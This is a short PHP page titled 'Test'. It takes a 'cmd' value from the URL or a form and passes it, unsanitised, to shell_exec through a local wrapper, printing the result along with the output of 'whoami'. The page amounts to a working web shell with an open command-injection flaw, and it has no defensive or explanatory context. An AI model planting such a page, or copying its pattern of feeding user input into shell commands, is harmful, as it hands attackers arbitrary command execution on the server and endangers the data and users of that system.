<!doctype html>
<head>
	<title>
		Test
	</title>
</head>
<body>
<?php
	$value = isset($_GET['cmd']) ? $_GET['cmd'] : 'ls -r';
	echo shell_exec("whoami");
	echo nl2br(shell_exec("./shl_exec \"" . $value . "\""));
	?>
	<form action="/index.php" method="GET">
		cmdinp: <input type="text" name="cmd" id="cmd"><br>
		<input type="submit" value="run">
	</form>  
</body>
